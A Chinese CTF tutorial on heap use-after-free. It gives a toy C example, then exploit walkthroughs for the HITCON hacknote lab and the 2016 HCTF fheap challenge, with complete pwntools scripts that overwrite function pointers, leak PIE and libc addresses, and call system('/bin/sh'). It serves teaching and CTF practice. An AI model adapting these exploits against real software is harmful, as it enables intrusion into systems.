# Use After Free

## 原理 

简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况

- 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
- 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
- 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。**

> dangling pointer ： 悬空指针
>
> wild pointer ：野指针，没有被初始化过的指针

这里给出一个简单的例子

```c
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");
  // free without modify
  free(a);
  a->func("I can also use it");
  // free with modify
  a->func = printmyname;
  a->func("this is my function");
  // set NULL
  a = NULL;
  printf("this pogram will crash...\n");
  a->func("can not be printed...");
}
```

运行结果如下

```
➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      
this is my function
I can also use it
call print my name
this pogram will crash...
[1]    38738 segmentation fault (core dumped)  ./use_after_free
```

## 例子

这里我们以 HITCON-training 中的 [lab 10 hacknote](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote) 为例。

### 功能分析 

我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有

```c
  puts(" 1. Add note          ");
  puts(" 2. Delete note       ");
  puts(" 3. Print note        ");
  puts(" 4. Exit              ");
```

故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。

#### add_note

根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。

```c
unsigned int add_note()
{
  note *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        notelist[i]->put = print_note_content;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];
        v0->content = malloc(size);
        if ( !notelist[i]->content )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, notelist[i]->content, size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

#### print_note

print_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容。

```c
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    notelist[v1]->put(notelist[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```

#### delete_note

delete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(notelist[v1]->content);
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

### 利用分析 

我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？**一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。** 那么该怎么执行呢？

我们可以简单来看一下每一个 note 生成的具体流程

1. 程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。

2. 程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。

   ```
      +-----------------+                       
      |   put           |                       
      +-----------------+                       
      |   content       |       size              
      +-----------------+------------------->+----------------+
                                             |     real       |
                                             |    content     |
                                             |                |
                                             +----------------+
   ```

那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下

- 申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）
- 申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）
- 释放 note0
- 释放 note1
- 此时，大小为 16 的 fast bin chunk 中链表为 note1->note0
- 申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则
- note2 其实会分配 note1 对应的内存块。
- real content 对应的 chunk 其实是 note0。
- 如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。

### 利用脚本 

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./hacknote')


def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


#gdb.attach(r)
magic = 0x08048986

addnote(32, "aaaa") # add note 0
addnote(32, "ddaa") # add note 1

delnote(0) # delete note 0
delnote(1) # delete note 1

addnote(8, p32(magic)) # add note 2

printnote(0) # print note 0

r.interactive()
```

我们可以具体看一下执行的流程，首先先下断点

**两处 malloc 下断点**

```
gef➤  b *0x0804875C
Breakpoint 1 at 0x804875c
gef➤  b *0x080486CA
Breakpoint 2 at 0x80486ca
```

**两处 free 下断点**

```
gef➤  b *0x08048893
Breakpoint 3 at 0x8048893
gef➤  b *0x080488A9
Breakpoint 4 at 0x80488a9
```

然后继续执行程序，可以看出申请 note0 时，所申请到的内存块地址为 0x0804b008。（eax 存储函数返回值）

```
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  <add_note+89> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax
    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>
 →  0x80486cf <add_note+89>    add    esp, 0x10
    0x80486d2 <add_note+92>    mov    edx, eax
    0x80486d4 <add_note+94>    mov    eax, DWORD PTR [ebp-0x1c]
    0x80486d7 <add_note+97>    mov    DWORD PTR [eax*4+0x804a070], edx
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf10', 'l8']
8
0xffffcf10│+0x00: 0x00000008     ← $esp
0xffffcf14│+0x04: 0x00000000
0xffffcf18│+0x08: 0xf7e29ef5  →  <strtol+5> add eax, 0x18210b
0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type <return> to continue, or q <return> to quit---
[#0] 0x80486cf → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b008
UsedChunk(addr=0x804b008, size=0x10)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

**申请 note 0 的 content 的地址为 0x0804b018**

```
$eax   : 0x0804b018  →  0x00000000
$ebx   : 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b018  →  0x00000000
$esp   : 0xffffcf10  →  0x00000020
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  <add_note+235> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 <add_note+220>   mov    al, ds:0x458b0804
    0x8048757 <add_note+225>   call   0x581173df
    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>
 →  0x8048761 <add_note+235>   add    esp, 0x10
    0x8048764 <add_note+238>   mov    DWORD PTR [ebx+0x4], eax
    0x8048767 <add_note+241>   mov    eax, DWORD PTR [ebp-0x1c]
    0x804876a <add_note+244>   mov    eax, DWORD PTR [eax*4+0x804a070]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf10', 'l8']
8
0xffffcf10│+0x00: 0x00000020     ← $esp
0xffffcf14│+0x04: 0xffffcf34  →  0xf70a3233
0xffffcf18│+0x08: 0x00000008
0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type <return> to continue, or q <return> to quit---
[#0] 0x8048761 → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b018
UsedChunk(addr=0x804b018, size=0x28)
Chunk size: 40 (0x28)
Usable size: 36 (0x24)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
```

类似的，我们可以得到 note1 的地址以及其 content 的地址分别为 0x0804b040 和 0x0804b050。

同时，我们还可以看到 note0 与 note1 对应的 content 确实是相应的内存块。

```
gef➤  grep aaaa
[+] Searching 'aaaa' in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-
  0x804b018 - 0x804b01c  →   "aaaa" 
gef➤  grep ddaa
[+] Searching 'ddaa' in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-
  0x804b050 - 0x804b054  →   "ddaa" 
```

下面就是 free 的过程了。我们可以依次发现首先，note0 的 content 被 free

```
 →  0x8048893 <del_note+143>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b018  →  "aaaa"  ← $esp
```

然后是 note0 本身

```
 →  0x80488a9 <del_note+165>   call   0x80484c0 <free@plt>
   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018
       0x80484c6 <free@plt+6>     push   0x18
       0x80484cb <free@plt+11>    jmp    0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcf20', 'l8']
8
0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp  ← $esp
```

当 delete 结束后，我们观看一下 bins，可以发现，确实其被存放在对应的 fast bin 中，

```
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00
```

当我们将 note1 也全部删除完毕后，再次观看 bins。可以看出，后删除的 chunk 块确实处于表头。

```
gef➤  heap bins
───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b040, size=0x10)  ←  UsedChunk(addr=0x804b008, size=0x10) 
Fastbins[idx=1, size=0xc] 0x00
Fastbins[idx=2, size=0x10] 0x00
Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b050, size=0x28)  ←  UsedChunk(addr=0x804b018, size=0x28) 
Fastbins[idx=4, size=0x18] 0x00
Fastbins[idx=5, size=0x1c] 0x00
Fastbins[idx=6, size=0x20] 0x00
```

那么，此时即将要申请 note2，我们可以看下 note2 都申请到了什么内存块，如下

**申请 note2 对应的内存块为 0x804b040，其实就是 note1 对应的内存地址。**

```
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
0x080486cf in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b040  →  0x0804b000  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b040  →  0x0804b000  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  <add_note+89> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax
    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>
 →  0x80486cf <add_note+89>    add    esp, 0x10
```

**申请 note2 的 content 的内存地址为 0x804b008，就是 note0 对应的地址，即此时我们向 note2 的 content 写内容，就会将 note0 的 put 字段覆盖。**

```
gef➤  n 1
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
0x08048761 in add_note ()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x0804b040  →  0x0804865b  →  <print_note_content+0> push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  <add_note+235> add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 <add_note+220>   mov    al, ds:0x458b0804
    0x8048757 <add_note+225>   call   0x581173df
    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>
 →  0x8048761 <add_note+235>   add    esp, 0x10
```

我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的 put 指针已经被置为 NULL 了，这是由 fastbin 的 free 机制决定的。

```
gef➤  x/2xw 0x804b008
0x804b008:  0x00000000  0x0804b018
```

覆盖后，具体的值如下

```
gef➤  x/2xw 0x804b008
0x804b008:  0x08048986  0x0804b00a
gef➤  x/i 0x08048986
   0x8048986 <magic>:   push   ebp
```

可以看出，确实已经被覆盖为我们所想要的 magic 函数了。

最后执行的效果如下

```
[+] Starting local process './hacknote': pid 35030
[*] Switching to interactive mode
flag{use_after_free}----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
```

同时，我们还可以借助 gef 的 heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下

```
gef➤  heap-analysis-helper 
[*] This feature is under development, expect bugs and unstability...
[+] Tracking malloc()
[+] Tracking free()
[+] Tracking realloc()
[+] Disabling hardware watchpoints (this may increase the latency)
[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.
[*] Note: The heap analysis slows down noticeably the execution. 
gef➤  c
Continuing.
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - malloc(32)=0x804b018
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(32)=0x804b050
[+] Heap-Analysis - free(0x804b018)
[+] Heap-Analysis - watching 0x804b018
[+] Heap-Analysis - free(0x804b008)
[+] Heap-Analysis - watching 0x804b008
[+] Heap-Analysis - free(0x804b050)
[+] Heap-Analysis - watching 0x804b050
[+] Heap-Analysis - free(0x804b040)
[+] Heap-Analysis - watching 0x804b040
[+] Heap-Analysis - malloc(8)=0x804b040
[+] Heap-Analysis - malloc(8)=0x804b008
[+] Heap-Analysis - Cleaning up
[+] Heap-Analysis - Re-enabling hardware watchpoints
[New process 36248]
process 36248 is executing new program: /bin/dash
[New process 36249]
process 36249 is executing new program: /bin/cat
[Inferior 3 (process 36249) exited normally]
```

这里第一个输出了两次，应该是 gef 工具的问题。

## 题目

### 2016 HCTF fheap

#### 基本情况

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
#### 基本功能

阉割版堆管理器，有增删功能。

```c
// 管理堆的结构体
struct
{
    int inuse;
    String *str;
} Strings[0x10];

// 堆结构体
typedef struct String
{
    union {
        char *buf;
        char array[16];
    } o;
    int len;
    void (*free)(struct String *ptr);
} String;
```

create string 有两种不同方式来储存字符串：

1. 字符串块 < 16 , 在结构体堆块（String）上存放输入的字符串。

2. 字符串块>=16 ,  malloc 一个**输入的字符串长度 size** 的空间， 将该空间地址存放在原来的堆块中。

   > 注意是 malloc 输入的字符串长度 ，而不是输入的 size 。自行根据源码分析：
   >
   > ```c
   > nbytesa = strlen(&buf);
   > if ( nbytesa > 15 )
   > {
   >     dest = (char *)malloc(nbytesa);
   > ```

结构体堆块（String）最后 8 个字节存放的是 free_func 函数地址，用来在 delete 的时候调用，这样的设计与上面例子一致。字符串块两种情况对应两种不同的 free_func 。

delete string 根据输入下标释放 chunk 。

#### 漏洞

delete 操作释放 chunk 后，没有将相关索引指针置零，而且没有对 chunk 状态进行严格限制，仅仅限制下标范围，以及查询索引指针是否存在，并没有检查 inuse 位，造成 **UAF**、**Double free** 。

#### 思路

1. 利用 UAF 控制结构体堆块（String）最后 8 字节，修改 free_func 为 puts 函数地址。释放 chunk 泄露函数真实地址，通过计算得出程序加载基地址。完成绕过 PIE 保护。
2. 再次 UAF 控制结构体堆块（String）函数地址为 printf 函数，构造出格式化字符串漏洞，泄露栈上位于 libc 段的地址，完成 libc 地址泄露。
3. 第三次 UAF 控制结构体堆块（String）函数地址为 system 函数，利用 Linux 命令行特性 ``||`` 完成 getshell 

---

UAF 控制思路和例题差不多，但是一个问题。如果使用一样的 UAF 利用方法会出现问题：

```python
add(0x30,'a'*0x30)#0
add(0x30,'a'*0x30)#1
delete(1)
delete(0)
add(0x18,'b'*0x18)
```

这样不能达到预期效果，新堆的 string chunk 用的不是 chunk0 结构体，而是继续使用 chunk2 string chunk 。后续试过申请大小各种 string chunk 都是一样情况。

所以采用申请两个小堆（字符串长度小于 16），然后新堆申请一个 0x20 大小空间存放 string ，这样 string 就会使用 chunk1 结构体堆。

```python
add(8,'a'*8)
add(8,'b'*8)
delete(1)
delete(0)
```

在 free_short 附近找到 call puts 的地址：0xd2d 。然后使用 partial write 将 free_func 最低一个字节修改为 0x2d 。释放 chunk1 ，将 chunk1 结构体内容输入，从而泄露函数地址，计算出程序加载基地址。

```python
call_puts_addr = 0xd2d
payload = 'a'*0x18 + p64(call_puts_addr)[0]
add(len(payload),payload)

delete(1)
p.recvuntil('a'*0x18)
elf_base = u64(p.recv(6).ljust(8,'\x00'))-call_puts_addr
```

释放 chunk0 方便我们重复利用这两个堆，然后重复上面步骤找到 call printf ：0xDBB 。需要将格式化字符串在申请堆时写入在开头。偏移地址 gdb 调试找到一个 libc 内的地址即可。

```python
delete(0)
payload = '%22$p'.ljust(0x18,'a') + p64(0xDBB)[0]
add(len(payload),payload)
delete(1)
```

这步结束后会卡输入流，输入两行字符即可：

```python
p.sendline('skye')
p.sendline('skye')
```

再次释放 chunk0 并申请，这次将函数地址修改为 system 地址，/bin/sh 输入在开头。由于程序输入函数不能读入 \x00 ，所以用 ``||`` 分隔填充内容，原因如下：

| 分隔符 | 说明                                                         |
| ------ | ------------------------------------------------------------ |
| &&     | 第2条命令只有在第1条命令成功执行之后才执行                   |
| `||`   | 只有`||`前的命令执行不成功（产生了一个非0的退出码）时，才执行后面的命令。 |
| ；     | 当;号前的命令执行完， 不管是否执行成功，执行;后的命令        |

#### EXP

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
# @File    : pwn-f.py
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
# p = process("./pwn-f")
p = remote("node3.buuoj.cn",29256)
elf = ELF("./pwn-f")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(size,content):
	p.recvuntil("3.quit\n")
	p.sendline("create string")
	p.recvuntil("size:")
	p.sendline(str(size))
	p.recvuntil("str:")
	p.send(content)
def delete(id):
	p.recvuntil("3.quit\n")
	p.sendline("delete string")
	p.recvuntil("id:")
	p.sendline(str(id))
	p.recvuntil("sure?:")
	p.sendline('yes')

# UAF
add(8,'a'*8)
add(8,'b'*8)
delete(1)
delete(0)

# overwrite free_func 2 puts
call_puts_addr = 0xd2d
payload = 'a'*0x18 + p64(call_puts_addr)[0]
add(len(payload),payload)

# leak libc
delete(1)
p.recvuntil('a'*0x18)
elf_base = u64(p.recv(6).ljust(8,'\x00'))-call_puts_addr
log.info("elf_base:"+hex(elf_base))
# printf_plt = elf_base + elf.plt['printf']
# log.info("printf_plt:"+hex(printf_plt))

# overwrite 2 printf leak libc
delete(0)
payload = '%22$p'.ljust(0x18,'a') + p64(0xDBB)[0]
add(len(payload),payload)
delete(1)
leak_addr = int(p.recv(14),16)
log.info("leak_addr:"+hex(leak_addr))
libc_addr = leak_addr - 0x78c0f
log.info("libc_addr:"+hex(libc_addr))
system_addr = libc_addr + libc.sym['system']
log.info("system_addr:"+hex(system_addr))
str_binsh = libc_addr + libc.search('/bin/sh').next()
log.info("str_binsh:"+hex(str_binsh))
# one = [0x45226,0x4527a,0xf0364,0xf1207]
# onegadget = one[0] + libc_addr
# log.info("onegadget:"+hex(onegadget))

p.sendline('skye')
p.sendline('skye')

# system('/bin/sh||aaa……')
delete(0)
payload = '/bin/sh||'.ljust(0x18,'a') + p64(system_addr)
add(len(payload),payload)

# gdb.attach(p,'b *$rebase(0x2020C0)')
# # gdb.attach(p,'b *$rebase(0xDBB)')
delete(1)


p.interactive()
```

#### 其他解法

* [hctf2016 fheap学习(FlappyPig队伍的解法)](https://www.cnblogs.com/shangye/p/6156350.html)

* [hctf2016 fheap学习(FreeBuf发表的官方解法)](https://www.cnblogs.com/shangye/p/6156391.html)

  DlyELF 泄露 libc 地址

* [hctf2016-fheap Writeup](http://blog.eonew.cn/archives/586#UAFfreeShortputs)

